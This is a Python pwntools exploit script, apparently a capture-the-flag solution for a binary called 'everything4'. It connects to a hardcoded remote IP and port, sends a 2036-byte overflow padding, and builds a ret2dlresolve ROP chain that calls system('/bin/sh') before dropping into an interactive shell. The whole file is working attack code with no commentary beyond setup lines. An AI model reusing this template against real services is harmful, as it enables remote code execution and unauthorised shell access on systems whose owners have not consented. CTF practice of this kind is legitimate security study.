#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './everything4' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/i386-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '103.191.63.187', 5001 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

    offset = 2036
    rop.raw(b'A' * offset)
    rop.gets(dlresolve.data_addr)
    rop.ret2dlresolve(dlresolve)

    io.sendline(rop.chain())
    io.sendline(dlresolve.payload)

    io.interactive()
    
if __name__ == '__main__':
    exploit()